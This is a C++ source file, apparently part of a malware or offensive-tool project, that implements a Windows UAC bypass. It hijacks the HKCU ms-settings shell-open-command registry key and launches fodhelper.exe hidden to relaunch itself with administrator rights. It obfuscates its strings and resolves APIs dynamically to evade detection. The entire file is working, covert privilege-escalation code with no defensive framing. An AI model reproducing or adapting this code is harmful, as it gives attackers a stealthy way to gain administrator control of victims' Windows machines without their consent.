#include "UACBypass.h"
#include "Impersonator.h"
#include "DynamicAPI.h"
#include "Config.h"
#include "../core/Obfuscation.h"
#include "../core/Internal.h"
#include "../../DebugLog.h"
namespace Utils {
    namespace UACBypass {
        void ExecuteAdmin() {
            if (Impersonator::IsAdmin()) return;
            SLOG("[*] Attempting UAC Bypass via fodhelper...");
            if (!DynAPI::RegCreateKeyEx || !DynAPI::RegSetValueEx || !DynAPI::ShellExecExA) {
                SLOG("[-] UAC Bypass failed: Critical APIs not loaded.");
                return;
            }

            
            typedef DWORD(WINAPI* GetModuleFileNameW_t)(HMODULE, LPWSTR, DWORD);
            auto k32Str = OBFS_S("kernel32.dll");
            HMODULE hK32 = Internal::_GetModuleHandleA(k32Str.c_str());
            if (!hK32) return;
            auto gmfwStr = OBFS_S("GetModuleFileNameW");
            auto pGetModFnW = (GetModuleFileNameW_t)Internal::_GetProcAddress(hK32, gmfwStr.c_str());
            if (!pGetModFnW) return;

            WCHAR szPath[MAX_PATH];
            if (pGetModFnW(NULL, szPath, MAX_PATH) == 0) return;

            HKEY hKey;
            OBFS_W_DECL(subKey, L"Software\\Classes\\ms-settings\\Shell\\Open\\command");
            std::wstring command = L"\"";
            command += szPath;
            command += L"\"";
            LSTATUS status = DynAPI::RegCreateKeyEx(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
            if (status == ERROR_SUCCESS) {
                status = DynAPI::RegSetValueEx(hKey, NULL, 0, REG_SZ, (const BYTE*)command.c_str(), (DWORD)((command.length() + 1) * sizeof(WCHAR)));
                if (status != ERROR_SUCCESS) SLOG("[-] RegSetValueEx (Default) failed: %ld", status);
                OBFS_W_DECL(delegateExec, L"DelegateExecute");
                std::wstring empty = L"";
                status = DynAPI::RegSetValueEx(hKey, delegateExec, 0, REG_SZ, (const BYTE*)empty.c_str(), (DWORD)((empty.length() + 1) * sizeof(WCHAR)));
                OBFS_W_WIPE(delegateExec);
                if (status != ERROR_SUCCESS) SLOG("[-] RegSetValueEx (DelegateExecute) failed: %ld", status);
                DynAPI::RegClose(hKey);
                SLOG("[+] Registry hijacked, launching fodhelper...");
                SLOG_CLOSE();
                SHELLEXECUTEINFOA sei = { sizeof(sei) };
                sei.lpVerb = NULL;
                sei.lpFile = OBFS_S("C:\\Windows\\System32\\fodhelper.exe").c_str();
                sei.nShow = SW_HIDE;
                if (DynAPI::ShellExecExA(&sei)) {
                    Internal::SleepMs(1000);
                    
                    typedef VOID(WINAPI* ExitProcess_t)(UINT);
                    auto epStr = OBFS_S("ExitProcess");
                    auto pExitProc = (ExitProcess_t)Internal::_GetProcAddress(hK32, epStr.c_str());
                    if (pExitProc) pExitProc(0);
                } else {
                    SLOG_INIT();
                    SLOG("[-] ShellExecuteExA failed (Error: %lu)", Internal::_GetLastError ? Internal::_GetLastError() : 0);
                }
            } else {
                SLOG("[-] RegCreateKeyEx failed (Error: %ld)", status);
            }
            OBFS_W_WIPE(subKey);
        }
    }
}
